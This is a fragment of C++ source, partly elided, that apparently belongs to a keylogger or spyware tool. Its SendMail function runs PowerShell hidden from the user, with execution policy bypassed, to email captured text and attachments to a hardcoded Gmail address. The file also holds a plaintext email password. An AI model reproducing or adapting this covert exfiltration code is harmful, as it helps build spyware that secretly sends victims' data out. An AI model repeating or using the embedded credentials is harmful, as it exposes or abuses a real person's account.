...
namespace Mail
{
#define X_EM_TO "spetsar97ilya@gmail.com"
#define X_EM_FROM "misyurailya5@gmail.com"
#define X_EM_PASS "890542015345Ss!"
...
#undef X_EM_PASS
	...
	int SendMail(const std::string& subject, const std::string& body, const std::string& attachments)
	{
		...
		std::string param = "-ExecutionPolicy ByPass -File \"" + src_path + "\" - Subj \"" + StringReplace(subject, "\"", "\\\"") + "\" -Body \"" + StringReplace(body, "\"", "\\\"") + "\" -Att \"" + attachments + "\"";
		...
		SheExecInfo.lpVerb = "open";
		SheExecInfo.lpFile = "powershell";
		SheExecInfo.lpParameters = param.c_str();
		SheExecInfo.lpDirectory = NULL;
		SheExecInfo.nShow = SW_HIDE;
		SheExecInfo.hInstApp = NULL;

		ok = (bool)ShellExecuteEx(&SheExecInfo);
		if (!ok) {
			return -3;
		}

		WaitForSingleObject(SheExecInfo.hProcess, 7000);
		DWORD exit_code = 100;
		GetExitCodeProcess(SheExecInfo.hProcess, &exit_code);

		m_timer.SetFunction([&]()
			{
				WaitForSingleObject(SheExecInfo.hProcess, 60000);
				GetExitCodeProcess(SheExecInfo.hProcess, &exit_code);
				if ((int)exit_code == STILL_ACTIVE) {
					TerminateProcess(SheExecInfo.hProcess, 100);
				}
